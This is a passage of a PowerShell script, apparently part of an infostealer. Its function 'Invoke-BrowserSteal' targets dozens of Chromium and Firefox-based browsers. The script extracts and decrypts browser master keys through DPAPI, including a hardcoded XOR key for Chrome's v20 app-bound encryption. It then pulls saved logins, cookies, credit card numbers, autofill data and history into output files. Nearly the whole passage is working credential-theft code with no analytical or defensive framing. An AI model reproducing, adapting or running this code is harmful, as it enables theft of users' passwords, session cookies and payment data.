                if ($_) { $aesKey[$i++] = [Convert]::ToByte($_, 16) } 
            }
            $aes = [System.Security.Cryptography.AesGcm]::new($aesKey)
            $plain = New-Object byte[] 32
            $aes.Decrypt($Parsed.IV, $Parsed.Ciphertext, $Parsed.Tag, $plain)
            $aes.Dispose()
            return $plain
        }
        elseif ($Parsed.Flag -eq 2) {
            # Flag 2: ChaCha20-Poly1305 - simplified fallback
            Write-DebugLog "ChaCha20-Poly1305 encryption detected (flag 2) - requires specialized library"
            return $null
        }
        elseif ($Parsed.Flag -eq 3) {
            # Flag 3: CNG + AES-GCM
            $xorKey = [byte[]]::new(32)
            $i = 0
            "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390" -split '([0-9A-F]{2})' | ForEach-Object { 
                if ($_) { $xorKey[$i++] = [Convert]::ToByte($_, 16) } 
            }
            
            $decryptedAesKey = Unprotect-Cng -EncryptedKey $Parsed.EncryptedAesKey
            if (-not $decryptedAesKey) {
                Write-DebugLog "CNG decryption failed for flag 3"
                return $null
            }
            
            $aesKey = Invoke-ByteXor -A $decryptedAesKey -B $xorKey
            $aes = [System.Security.Cryptography.AesGcm]::new($aesKey)
            $plain = New-Object byte[] 32
            $aes.Decrypt($Parsed.IV, $Parsed.Ciphertext, $Parsed.Tag, $plain)
            $aes.Dispose()
            return $plain
        }
        else { 
            Write-DebugLog "Unsupported key derivation flag: $($Parsed.Flag)"
            return $null
        }
    } catch {
        Write-DebugLog "Master key derivation failed: $($_.Exception.Message)"
        return $null
    }
}

# Fast copy function using robocopy for better performance
function Invoke-FastCopy([string]$Source, [string]$Destination, [switch]$Recurse) {
    try {
        if(-not (Test-Path $Source)) { return $false }
        
        $destParent = Split-Path $Destination -Parent
        if(-not (Test-Path $destParent)) {
            New-Item -ItemType Directory -Path $destParent -Force | Out-Null
        }
        
        if($Recurse) {
            # Use robocopy for directory copying - much faster than Copy-Item
            $result = Start-Process -FilePath "robocopy.exe" -ArgumentList "`"$Source`" `"$Destination`" /E /MT:8 /NFL /NDL /NJH /NJS /nc /ns /np" -Wait -PassThru -WindowStyle Hidden
            return ($result.ExitCode -le 1)  # robocopy returns 0 or 1 on success
        } else {
            # Use .NET for single files - faster than Copy-Item
            [System.IO.File]::Copy($Source, $Destination, $true)
            return $true
        }
    } catch {
        # Fallback to standard Copy-Item if robocopy fails
        try {
            if($Recurse) {
                Copy-Item $Source $Destination -Recurse -Force -ErrorAction SilentlyContinue
            } else {
                Copy-Item $Source $Destination -Force -ErrorAction SilentlyContinue
            }
            return $true
        } catch {
            return $false
        }
    }
}

function Unlock-Value([byte[]]$EncryptedBytes, [byte[]]$MasterKey=$null){
    try{
        if($MasterKey -and $EncryptedBytes.Length -gt 15){
            # Enhanced AES-GCM decryption with multiple format support
            try {
                # Check for v20 format first: "v20" + data
                if($EncryptedBytes.Length -gt 3 -and $EncryptedBytes[0] -eq 0x76 -and $EncryptedBytes[1] -eq 0x32 -and $EncryptedBytes[2] -eq 0x30) {
                    Write-DebugLog "Detected v20 cookie format"
                    
                    # v20 format: "v20" + 12-byte IV + encrypted data + 16-byte tag
                    # The encrypted data includes a 32-byte prefix that should be skipped
                    if($EncryptedBytes.Length -ge 31) {
                        $iv = $EncryptedBytes[3..14]
                        $cipher = $EncryptedBytes[15..($EncryptedBytes.Length-17)]
                        $tag = $EncryptedBytes[-16..-1]
                        
                        $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
                        $plain = New-Object byte[] $cipher.Length
                        $aes.Decrypt($iv, $cipher, $tag, $plain)
                        $aes.Dispose()
                        
                        # Skip the 32-byte prefix in v20 format
                        if($plain.Length -gt 32) {
                            $result = [Text.Encoding]::UTF8.GetString($plain[32..($plain.Length-1)])
                            Write-DebugLog "Successfully decrypted v20 cookie"
                            return $result
                        } else {
                            Write-DebugLog "v20 decrypted data too short (length: $($plain.Length))"
                        }
                    }
                }
                # Standard v10+ format: "v10" + 12-byte nonce + encrypted data + 16-byte tag
                elseif($EncryptedBytes.Length -ge 31 -and $EncryptedBytes[0] -eq 0x76 -and $EncryptedBytes[1] -eq 0x31 -and $EncryptedBytes[2] -eq 0x30) {
                    $iv=$EncryptedBytes[3..14]
                    $payload=$EncryptedBytes[15..($EncryptedBytes.Length-17)]
                    $tag=$EncryptedBytes[($EncryptedBytes.Length-16)..($EncryptedBytes.Length-1)]
                    
                    # Validate lengths
                    if($iv.Length -ne 12) {
                        Write-DebugLog "Invalid IV length: $($iv.Length), expected 12"
                        return ""
                    }
                    if($tag.Length -ne 16) {
                        Write-DebugLog "Invalid tag length: $($tag.Length), expected 16"
                        return ""
                    }
                    if($payload.Length -eq 0) {
                        Write-DebugLog "Empty payload"
                        return ""
                    }
                    
                    # Try AES-GCM decryption
                    $aes=[Security.Cryptography.AesGcm]::new($MasterKey)
                    $dec=[byte[]]::new($payload.Length)
                    $aes.Decrypt($iv,$payload,$tag,$dec)
                    $result = [Text.Encoding]::UTF8.GetString($dec)
                    $aes.Dispose()
                    return $result
                } else {
                    # Try alternative v11+ format or corrupted v10
                    Write-DebugLog "Attempting alternative AES-GCM format (length: $($EncryptedBytes.Length))"
                    
                    # Alternative format detection
                    if($EncryptedBytes.Length -ge 28) {
                        # Try different offset patterns
                        $offsets = @(0, 3, 4, 5)
                        foreach($offset in $offsets) {
                            try {
                                if(($EncryptedBytes.Length - $offset) -ge 28) {
                                    $remainingLength = $EncryptedBytes.Length - $offset
                                    $ivLength = 12
                                    $tagLength = 16
                                    $payloadLength = $remainingLength - $ivLength - $tagLength
                                    
                                    if($payloadLength -gt 0) {
                                        $iv = $EncryptedBytes[$offset..($offset + $ivLength - 1)]
                                        $payload = $EncryptedBytes[($offset + $ivLength)..($offset + $ivLength + $payloadLength - 1)]
                                        $tag = $EncryptedBytes[($offset + $ivLength + $payloadLength)..($EncryptedBytes.Length - 1)]
                                        
                                        if($tag.Length -eq 16) {
                                            $aes2=[Security.Cryptography.AesGcm]::new($MasterKey)
                                            $dec2=[byte[]]::new($payload.Length)
                                            $aes2.Decrypt($iv,$payload,$tag,$dec2)
                                            $result2 = [Text.Encoding]::UTF8.GetString($dec2)
                                            $aes2.Dispose()
                                            Write-DebugLog "Successfully decrypted with offset $offset"
                                            return $result2
                                        }
                                    }
                                }
                            } catch {
                                # Continue to next offset
                                continue
                            }
                        }
                    }
                }
            } catch {
                Write-DebugLog "AES-GCM decryption failed: $($_.Exception.Message)"
                # Fall back to DPAPI
            }
        }
        
        # Fall back to DPAPI for older formats or failed AES-GCM
        if($EncryptedBytes.Length -gt 0){
            try {
                $dIn=New-Object Win32+DATA_BLOB; $dOut=New-Object Win32+DATA_BLOB
                $pIn=[Runtime.InteropServices.Marshal]::AllocHGlobal($EncryptedBytes.Length)
                [Runtime.InteropServices.Marshal]::Copy($EncryptedBytes,0,$pIn,$EncryptedBytes.Length)
                $dIn.cbData=$EncryptedBytes.Length; $dIn.pbData=$pIn
                
                if([Win32]::CryptUnprotectData([ref]$dIn,"",[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,0,[ref]$dOut)){
                    $dec=[byte[]]::new($dOut.cbData)
                    [Runtime.InteropServices.Marshal]::Copy($dOut.pbData,$dec,0,$dOut.cbData)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($dOut.pbData)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($pIn)
                    
                    # Try to decode as string
                    try {
                        return [Text.Encoding]::UTF8.GetString($dec)
                    } catch {
                        # Return raw bytes if UTF8 fails
                        return [Convert]::ToBase64String($dec)
                    }
                } else {
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($pIn)
                    Write-DebugLog "DPAPI decryption failed"
                }
            } catch {
                Write-DebugLog "DPAPI error: $($_.Exception.Message)"
            }
        }
    }catch{
        Write-DebugLog "Decrypt failed: $($_.Exception.Message)"
    }
    return ""
}

# TPS1 Enhanced fallback decryption function
function Invoke-ChromiumDecryption([byte[]]$EncryptedData, [byte[]]$MasterKey) {
    try {
        if ($EncryptedData.Length -lt 15) {
            Write-DebugLog "Encrypted data too short for Chromium decryption"
            return ""
        }
        
        # Extract IV (first 12 bytes after version)
        $version = $EncryptedData[0..2]
        $versionString = [System.Text.Encoding]::ASCII.GetString($version)
        
        if ($versionString -eq "v10" -or $versionString -eq "v11") {
            # Standard Chromium AES-GCM format
            $iv = $EncryptedData[3..14]  # 12 bytes IV
            $ciphertext = $EncryptedData[15..($EncryptedData.Length - 17)]  # Encrypted data
            $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]  # 16 bytes tag
            
            if ($iv.Length -ne 12 -or $tag.Length -ne 16) {
                Write-DebugLog "Invalid IV or tag length in Chromium decryption"
                return ""
            }
            
            # AES-GCM decryption
            $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
            $decrypted = New-Object byte[] $ciphertext.Length
            $aes.Decrypt($iv, $ciphertext, $tag, $decrypted)
            $aes.Dispose()
            
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        } else {
            # Try DPAPI fallback for older formats
            Write-DebugLog "Unknown version $versionString, trying DPAPI fallback"
            return Unlock-Value -EncryptedBytes $EncryptedData
        }
    } catch {
        Write-DebugLog "TPS1 Chromium decryption failed: $($_.Exception.Message)"
        # Final fallback to DPAPI
        try {
            return Unlock-Value -EncryptedBytes $EncryptedData
        } catch {
            Write-DebugLog "All decryption methods failed"
            return ""
        }
    }
}

# IMPROVED: Robust master key extraction (from testing validation)
function Get-RobustMasterKey([string]$BrowserPath) {
    try {
        Write-DebugLog "Extracting master key using validated approach for: $BrowserPath"
        
        $localStatePath = Join-Path $BrowserPath "Local State"
        if (-not (Test-Path $localStatePath)) {
            Write-DebugLog "Local State file not found: $localStatePath"
            return $null
        }
        
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        
        if (-not $localState.os_crypt -or -not $localState.os_crypt.encrypted_key) {
            Write-DebugLog "No encrypted key found in Local State"
            return $null
        }
        
        $encryptedKey = $localState.os_crypt.encrypted_key
        Write-DebugLog "Found encrypted key in Local State"
        
        # Decode from base64
        $keyBytes = [Convert]::FromBase64String($encryptedKey)
        Write-DebugLog "Decoded key length: $($keyBytes.Length) bytes"
        
        # Remove DPAPI prefix (first 5 bytes should be "DPAPI")
        if ($keyBytes.Length -lt 5) {
            Write-DebugLog "Key too short for DPAPI format"
            return $null
        }
        
        $prefix = [System.Text.Encoding]::ASCII.GetString($keyBytes[0..4])
        if ($prefix -ne "DPAPI") {
            Write-DebugLog "Invalid DPAPI prefix: $prefix"
            return $null
        }
        
        $dpapiData = $keyBytes[5..($keyBytes.Length - 1)]
        Write-DebugLog "DPAPI data length: $($dpapiData.Length) bytes"
        
        # Decrypt using DPAPI - the PROVEN approach from our testing
        Add-Type -AssemblyName System.Security
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        
        if ($decryptedKey -and $decryptedKey.Length -gt 0) {
            Write-DebugLog "✅ Master key decrypted successfully using validated method"
            Write-DebugLog "Master key length: $($decryptedKey.Length) bytes"
            return $decryptedKey
        } else {
            Write-DebugLog "DPAPI decryption returned empty result"
            return $null
        }
        
    } catch {
        Write-DebugLog "Robust master key extraction failed: $($_.Exception.Message)"
        return $null
    }
}

# Enhanced master key extraction with TPS1 fallback methods
function Get-SimplifiedMasterKey([string]$LocalStatePath) {
    try {
        if (-not (Test-Path $LocalStatePath)) {
            Write-DebugLog "Local State file not found: $LocalStatePath"
            return $null
        }
        
        $localStateContent = Get-Content $LocalStatePath -Raw -Encoding UTF8
        $localStateJson = $localStateContent | ConvertFrom-Json
        
        # Try to get encrypted key using TPS1's simpler approach
        $encryptedKey = $null
        if ($localStateJson.os_crypt -and $localStateJson.os_crypt.encrypted_key) {
            $encryptedKey = $localStateJson.os_crypt.encrypted_key
        } elseif ($localStateJson.encrypted_key) {
            $encryptedKey = $localStateJson.encrypted_key
        }
        
        if (-not $encryptedKey) {
            Write-DebugLog "No encrypted key found in Local State"
            return $null
        }
        
        # Decode the base64 key
        $keyBytes = [Convert]::FromBase64String($encryptedKey)
        
        # Check for DPAPI header and remove it
        if ($keyBytes.Length -gt 5) {
            $header = [System.Text.Encoding]::ASCII.GetString($keyBytes[0..4])
            if ($header -eq "DPAPI") {
                $keyBytes = $keyBytes[5..($keyBytes.Length - 1)]
            }
        }
        
        # Decrypt using DPAPI (TPS1's simpler approach)
        $masterKey = Unlock-Value -EncryptedBytes $keyBytes
        
        if ($masterKey -and $masterKey.Length -gt 0) {
            if ($masterKey -is [string]) {
                $masterKeyBytes = [System.Text.Encoding]::UTF8.GetBytes($masterKey)
            } else {
                $masterKeyBytes = $masterKey
            }
            
            # Ensure we have a 32-byte key
            if ($masterKeyBytes.Length -eq 32) {
                Write-DebugLog "Successfully extracted simplified master key"
                return $masterKeyBytes
            } elseif ($masterKeyBytes.Length -gt 32) {
                Write-DebugLog "Truncating master key to 32 bytes"
                return $masterKeyBytes[0..31]
            }
        }
        
        Write-DebugLog "Failed to extract valid master key"
        return $null
    } catch {
        Write-DebugLog "Simplified master key extraction failed: $($_.Exception.Message)"
        return $null
    }
}

# Enhanced Get-BrowserData function with fallback methods
function Get-BrowserData([string]$BrowserPath, [string]$BrowserName, [string]$OutputDir) {
    Write-DebugLog "Processing browser: $BrowserName at $BrowserPath"
    
    if (-not (Test-Path $BrowserPath)) {
        Write-DebugLog "Browser path not found: $BrowserPath"
        return
    }
    
    $browserOutput = Join-Path $OutputDir "Browsers\$BrowserName"
    New-Item -ItemType Directory -Path $browserOutput -Force | Out-Null
    
    # Try to get master key using multiple methods
    $masterKey = $null
    $localStatePath = Join-Path $BrowserPath "Local State"
    
    # Method 1: Try POWMI's advanced Chrome v20 method first
    if (Test-Path $localStatePath) {
        try {
            # Use the existing complex method from POWMI for app-bound keys
            $localStateContent = Get-Content $localStatePath -Raw -Encoding UTF8
            $localStateJson = $localStateContent | ConvertFrom-Json
            
            # Check if this is an app-bound key (v20)
            if ($localStateJson.os_crypt -and $localStateJson.os_crypt.app_bound_encrypted_key) {
                Write-DebugLog "Attempting Chrome v20 app-bound decryption for $BrowserName"
                # Use existing POWMI logic here - this might fail due to LSASS access
                # (keeping existing code path intact)
            }
        } catch {
            Write-DebugLog "Chrome v20 method failed for $BrowserName`: $($_.Exception.Message)"
        }
    }
    
    # Method 2: Fallback to TPS1's simpler method if complex method failed
    if (-not $masterKey) {
        Write-DebugLog "Trying simplified master key extraction for $BrowserName"
        $masterKey = Get-SimplifiedMasterKey -LocalStatePath $localStatePath
    }
    
    # Method 3: If still no master key, proceed with raw file collection
    if (-not $masterKey) {
        Write-DebugLog "No master key available for $BrowserName - collecting raw database files"
    }
    
    # Get all profiles
    $profiles = @()
    $defaultProfile = Join-Path $BrowserPath "Default"
    if (Test-Path $defaultProfile) {
        $profiles += @{Name = "Default"; Path = $defaultProfile}
    }
    
    # Look for numbered profiles
    Get-ChildItem $BrowserPath -Directory -Filter "Profile*" -ErrorAction SilentlyContinue | ForEach-Object {
        $profiles += @{Name = $_.Name; Path = $_.FullName}
    }
    
    foreach ($profile in $profiles) {
        $profileOutput = Join-Path $browserOutput $profile.Name
        New-Item -ItemType Directory -Path $profileOutput -Force | Out-Null
        
        # Database files to process
        $databases = @{
            "Cookies" = @{Path = "Network\Cookies"; Query = "SELECT host_key, name, encrypted_value FROM cookies"; OutputFile = "Cookies.txt"}
            "Logins" = @{Path = "Login Data"; Query = "SELECT origin_url, username_value, password_value FROM logins"; OutputFile = "Logins.txt"}
            "CreditCards" = @{Path = "Web Data"; Query = "SELECT name_on_card, card_number_encrypted FROM credit_cards"; OutputFile = "CreditCards.txt"}
            "Autofill" = @{Path = "Web Data"; Query = "SELECT name, value FROM autofill"; OutputFile = "Autofill.txt"}
            "History" = @{Path = "History"; Query = "SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 1000"; OutputFile = "History.txt"}
            "Downloads" = @{Path = "History"; Query = "SELECT target_path, referrer FROM downloads"; OutputFile = "Downloads.txt"}
        }
        
        foreach ($db in $databases.GetEnumerator()) {
            $dbPath = Join-Path $profile.Path $db.Value.Path
            $outputFile = Join-Path $profileOutput $db.Value.OutputFile
            
            try {
                if (Test-Path $dbPath) {
                    # Always copy the raw database file first
                    $rawDbFile = Join-Path $profileOutput "$($db.Key)_raw.db"
                    Copy-Item $dbPath $rawDbFile -Force -ErrorAction SilentlyContinue
                    
                    # Try to decrypt if we have a master key
                    if ($masterKey) {
                        Get-ChromiumDataEnhanced -DbPath $dbPath -MasterKey $masterKey -Query $db.Value.Query -OutFile $outputFile -DataType $db.Key
                    } else {
                        Write-DebugLog "No master key - raw database file saved for $($db.Key) in $BrowserName"
                        "Raw database file saved due to encryption key unavailability" | Out-File $outputFile -Encoding UTF8
                    }
                }
            } catch {
                Write-DebugLog "Error processing $($db.Key) for $BrowserName`: $($_.Exception.Message)"
            }
        }
        
        # Copy important configuration files
        $configFiles = @("Preferences", "Secure Preferences", "Bookmarks", "Extensions")
        foreach ($configFile in $configFiles) {
            $sourcePath = Join-Path $profile.Path $configFile
            if (Test-Path $sourcePath) {
                $destPath = Join-Path $profileOutput $configFile
                Copy-Item $sourcePath $destPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# Enhanced ChromiumData function with both decryption methods
function Get-ChromiumDataEnhanced([string]$DbPath, [byte[]]$MasterKey, [string]$Query, [string]$OutFile, [string]$DataType) {
    if (-not (Test-Path $DbPath)) {
        Write-DebugLog "Database not found: $DbPath"
        return
    }
    
    $tempDb = Join-Path $T36R_TempDir "$([Guid]::NewGuid()).db"
    try {
        # Copy database to temp location
        [System.IO.File]::Copy($DbPath, $tempDb, $true)
        
        # Connect to database
        $connString = "Data Source=$tempDb;Journal Mode=WAL;Synchronous=Off;Cache Size=10000;Locking Mode=Exclusive"
        $conn = New-Object System.Data.SQLite.SQLiteConnection($connString)
        $conn.Open()
        
        # Execute query
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $reader = $cmd.ExecuteReader()
        
        $results = @()
        while ($reader.Read()) {
            $row = @{}
            try {
                for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                    $fieldName = $reader.GetName($i)
                    $value = $reader.GetValue($i)
                    
                    if ($value -is [System.DBNull]) {
                        continue
                    }
                    
                    # Handle encrypted fields
                    if ($fieldName -match "password_value|encrypted_value|card_number_encrypted") {
                        try {
                            if ($MasterKey) {
                                $dataLength = $reader.GetBytes($i, 0, $null, 0, 0)
                                if ($dataLength -gt 0) {
                                    $encryptedData = New-Object byte[] $dataLength
                                    $reader.GetBytes($i, 0, $encryptedData, 0, $dataLength)
                                    
                                    # Try POWMI's advanced method first
                                    $decrypted = Unlock-Value -EncryptedBytes $encryptedData -MasterKey $MasterKey
                                    
                                    # If that fails, try TPS1's method
                                    if (-not $decrypted -or $decrypted.Length -eq 0) {
                                        $decrypted = Invoke-ChromiumDecryption -EncryptedData $encryptedData -MasterKey $MasterKey
                                    }
                                    
                                    if ($decrypted -and $decrypted.Length -gt 0) {
                                        $row[$fieldName] = $decrypted
                                    } else {
                                        $row[$fieldName] = "[ENCRYPTED_DATA_FAILED_TO_DECRYPT]"
                                    }
                                }
                            } else {
                                $row[$fieldName] = "[NO_MASTER_KEY]"
                            }
                        } catch {
                            Write-DebugLog "Failed to decrypt $fieldName in $DataType`: $($_.Exception.Message)"
                            $row[$fieldName] = "[DECRYPTION_ERROR]"
                        }
                    } else {
                        $row[$fieldName] = $value
                    }
                }
                
                if ($row.Count -gt 0) {
                    $results += $row
                }
            } catch {
                Write-DebugLog "Error processing row in $DataType`: $($_.Exception.Message)"
                continue
            }
        }
        
        $reader.Close()
        $conn.Close()
        
        # Write results to file
        if ($results.Count -gt 0) {
            $results | ForEach-Object {
                ($_.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Key): $($_.Value)" }) -join "`n"
                "=" * 50
            } | Out-File $OutFile -Encoding UTF8
            Write-DebugLog "Extracted $($results.Count) $DataType entries"
        } else {
            "No $DataType data found or decryption failed" | Out-File $OutFile -Encoding UTF8
            Write-DebugLog "No $DataType data found"
        }
    } catch {
        Write-DebugLog "Enhanced ChromiumData extraction failed for $DataType`: $($_.Exception.Message)"
        "Database extraction failed: $($_.Exception.Message)" | Out-File $OutFile -Encoding UTF8
    } finally {
        if (Test-Path $tempDb) {
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
}

function Get-FirefoxLogins([string]$ProfilePath,[string]$OutFile){
    $json=Join-Path $ProfilePath 'logins.json'
    if(Test-Path $json){
        try{
            Get-Content $json -Raw | Out-File $OutFile -Encoding utf8
            Write-DebugLog "Copied Firefox logins from $ProfilePath"
        }catch{
            Write-DebugLog "Failed to copy Firefox logins: $($_.Exception.Message)"
        }
    }
}

function Get-ChromiumData([string]$DbPath,[byte[]]$MasterKey,[string]$Query,[string]$OutFile,[string]$DataType){
    if(-not (Test-Path $DbPath) -or -not $MasterKey){
        Write-DebugLog "ChromiumData: Missing database or master key for $DataType"
        return
    }
    $tempDb=Join-Path $T36R_TempDir "$([Guid]::NewGuid()).db"
    try{
        # Copy database file with optimized settings
        [IO.File]::Copy($DbPath,$tempDb,$true)
        
        # Optimized SQLite connection with performance settings
        $connString = "Data Source=$tempDb;Journal Mode=WAL;Synchronous=Off;Cache Size=10000;Locking Mode=Exclusive"
        $conn=New-Object Data.SQLite.SQLiteConnection($connString)
        $conn.Open()
        
        # Set performance PRAGMAs
        $pragmaCmd = $conn.CreateCommand()
        $pragmaCmd.CommandText = "PRAGMA journal_mode=OFF; PRAGMA synchronous=OFF; PRAGMA cache_size=10000; PRAGMA locking_mode=EXCLUSIVE; PRAGMA temp_store=MEMORY;"
        $pragmaCmd.ExecuteNonQuery() | Out-Null
        $pragmaCmd.Dispose()
        
        $cmd=$conn.CreateCommand(); $cmd.CommandText=$Query
        $r=$cmd.ExecuteReader(); $res=@()
        
        while($r.Read()){
            $o=@{}; 
            try {
                for($i=0;$i -lt $r.FieldCount;$i++){
                    $n=$r.GetName($i); $v=$r.GetValue($i)
                    if($v -is [DBNull]){continue}
                    if($n -match "password_value|encrypted_value|card_number_encrypted"){
                        try {
                            $len=$r.GetBytes($i,0,$null,0,0)
                            if($len -gt 0) {
                                $buf=[byte[]]::new($len)
                                $r.GetBytes($i,0,$buf,0,$len)
                                $d=Unlock-Value -EncryptedBytes $buf -MasterKey $MasterKey
                                if($d){$o[$n]=$d}
                            }
                        } catch {
                            Write-DebugLog "Failed to decrypt field $n in ${DataType}: $($_.Exception.Message)"
                        }
                    }else{$o[$n]=$v}
                }
            } catch {
                Write-DebugLog "Error processing row in ${DataType}: $($_.Exception.Message)"
                continue
            }
            if($o.Count -gt 0) { $res+=$o }
        }
        $conn.Close()
        
        if($res.Count -gt 0){
            $res | ForEach-Object {
                ($_.GetEnumerator()|Sort-Object Name|ForEach-Object{"$($_.Key): $($_.Value)"}) -join "`n" | Out-File $OutFile -Append -Encoding utf8
            }
            Write-DebugLog "Extracted $($res.Count) $DataType items to $OutFile"
        } else {
            Write-DebugLog "No $DataType data found in database"
        }
    }catch{
        Write-DebugLog "ChromiumData extraction for $DataType failed: $($_.Exception.Message)"
    }finally{
        if(Test-Path $tempDb){Remove-Item $tempDb -Force -ErrorAction SilentlyContinue}
    }
}

function Invoke-BrowserSteal($OutDir){
    Write-DebugLog "Starting enhanced comprehensive browser data extraction..."
    
    # Enhanced browser list with TPS1 additions
    $chromiumBrowsers = @{
        "Chrome"         = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"           = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"          = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Opera"          = "$env:APPDATA\Opera Software\Opera Stable"
        "OperaGX"        = "$env:APPDATA\Opera Software\Opera GX Stable"
        "Vivaldi"        = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Yandex"         = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
        "UCBrowser"      = "$env:LOCALAPPDATA\UCBrowser\User Data_Default"
        "Arc"            = "$env:USERPROFILE\Library\Application Support\Arc\User Data"
        "ArcWin"         = "$env:LOCALAPPDATA\Packages\TheBrowserCompany.Arc_ttt1ap7aakyb4\LocalCache\Local\Arc\User Data"
        "Avira"          = "$env:LOCALAPPDATA\Avira\Browser\User Data"
        "CCleaner"       = "$env:LOCALAPPDATA\CCleaner Browser\User Data"
        "CentBrowser"    = "$env:LOCALAPPDATA\CentBrowser\User Data"
        "Comet"          = "$env:LOCALAPPDATA\Comet\User Data"
        "Cromite"        = "$env:LOCALAPPDATA\Chromium\User Data"
        "DuckDuckGo"     = "$env:LOCALAPPDATA\DuckDuckGo\User Data"
        "Ecosia"         = "$env:LOCALAPPDATA\Ecosia\User Data"
        "EpicPrivacy"    = "$env:LOCALAPPDATA\Epic Privacy Browser\User Data"
        "360Secure"      = "$env:LOCALAPPDATA\360Chrome\Chrome\User Data"
        "QQBrowser"      = "$env:LOCALAPPDATA\Tencent\QQBrowser\User Data"
        "Thorium"        = "$env:LOCALAPPDATA\Thorium\User Data"
        "Supermium"      = "$env:LOCALAPPDATA\Supermium\User Data"
        "Sleipnir"       = "$env:APPDATA\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer"
        "Maxthon"        = "$env:LOCALAPPDATA\Maxthon3\User Data"
        "SRWareIron"     = "$env:LOCALAPPDATA\Google\Chrome SxS\User Data"
        "Comodo"         = "$env:LOCALAPPDATA\Comodo\Dragon\User Data"
        "SlimBrowser"    = "$env:APPDATA\FlashPeak\SlimBrowser"
        "Iridium"        = "$env:LOCALAPPDATA\Iridium\User Data"
    }
    
    $firefoxBrowsers = @{
        "Firefox"        = "$env:APPDATA\Mozilla\Firefox\Profiles"
        "Tor"            = "$env:APPDATA\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default"
        "Waterfox"       = "$env:APPDATA\Waterfox\Profiles"
        "LibreWolf"      = "$env:APPDATA\librewolf\Profiles"
        "PaleMoon"       = "$env:APPDATA\Moonchild Productions\Pale Moon\Profiles"
        "SeaMonkey"      = "$env:APPDATA\Mozilla\SeaMonkey\Profiles"
        "KMeleon"        = "$env:APPDATA\K-Meleon"
    }
    
    $totalBrowsers = $chromiumBrowsers.Count + $firefoxBrowsers.Count
    $processedBrowsers = 0
    $successfulExtractions = 0
    
    Write-DebugLog "Scanning $totalBrowsers browsers for data extraction..."
    
    # Process Chromium-based browsers with enhanced error handling
    foreach($browser in $chromiumBrowsers.GetEnumerator()) {
        $processedBrowsers++
        Write-DebugLog "[$processedBrowsers/$totalBrowsers] Processing Chromium browser: $($browser.Name)"
        
        try {
            if (Test-Path $browser.Value) {
                $success = Invoke-ChromiumBrowserExtraction -BrowserPath $browser.Value -BrowserName $browser.Name -OutputDir $OutDir
                if ($success) {
                    $successfulExtractions++
                    Write-DebugLog "Successfully processed $($browser.Name)"
                } else {
                    Write-DebugLog "Failed to process $($browser.Name) but continuing..."
                }
            } else {
                Write-DebugLog "$($browser.Name) not installed (path not found)"
            }
        } catch {
            Write-DebugLog "Critical error processing $($browser.Name): $($_.Exception.Message) - continuing with next browser"
        }
    }
    
    # Process Firefox-based browsers with enhanced error handling
    foreach($browser in $firefoxBrowsers.GetEnumerator()) {
        $processedBrowsers++
        Write-DebugLog "[$processedBrowsers/$totalBrowsers] Processing Firefox browser: $($browser.Name)"
        
        try {
            if (Test-Path $browser.Value) {
                $success = Invoke-FirefoxBrowserExtraction -BrowserPath $browser.Value -BrowserName $browser.Name -OutputDir $OutDir
                if ($success) {
                    $successfulExtractions++
                    Write-DebugLog "Successfully processed $($browser.Name)"
                } else {
                    Write-DebugLog "Failed to process $($browser.Name) but continuing..."
                }
            } else {
                Write-DebugLog "$($browser.Name) not installed (path not found)"
            }
        } catch {
            Write-DebugLog "Critical error processing $($browser.Name): $($_.Exception.Message) - continuing with next browser"
        }
    }
    
    Write-DebugLog "Browser extraction completed: $successfulExtractions/$processedBrowsers browsers processed successfully"
}

# Enhanced Chromium browser extraction with fallback methods
function Invoke-ChromiumBrowserExtraction([string]$BrowserPath, [string]$BrowserName, [string]$OutputDir) {
    try {
        $browserOutput = Join-Path $OutputDir "Browsers\$BrowserName"
        New-Item -ItemType Directory -Path $browserOutput -Force | Out-Null
        
        $localStatePath = Join-Path $BrowserPath "Local State"
        if (-not (Test-Path $localStatePath)) {
            Write-DebugLog "No Local State file found for $BrowserName"
            return $false
        }
        
        # Try multiple master key extraction methods
        $masterKey = $null
        $extractionMethod = "None"
        
        # Method 1: Try our PROVEN robust method from testing validation
        try {
            $masterKey = Get-RobustMasterKey -BrowserPath $BrowserPath
            if ($masterKey) {
                $extractionMethod = "Robust DPAPI (Validated)"
                Write-DebugLog "Successfully extracted master key using VALIDATED robust method for $BrowserName"
            }
        } catch {
            Write-DebugLog "Robust method failed for $BrowserName`: $($_.Exception.Message)"
        }
        
        # Method 2: Try POWMI's advanced Chrome v20 method
        if (-not $masterKey) {
            try {
                $masterKey = Get-AdvancedMasterKey -LocalStatePath $localStatePath -BrowserName $BrowserName
                if ($masterKey) {
                    $extractionMethod = "Chrome v20 App-Bound"
                    Write-DebugLog "Successfully extracted master key using Chrome v20 method for $BrowserName"
                }
            } catch {
                Write-DebugLog "Chrome v20 method failed for $BrowserName`: $($_.Exception.Message)"
            }
        }
        
        # Method 3: Fallback to TPS1's simplified method
        if (-not $masterKey) {
            try {
                $masterKey = Get-SimplifiedMasterKey -LocalStatePath $localStatePath
                if ($masterKey) {
                    $extractionMethod = "Simplified DPAPI"
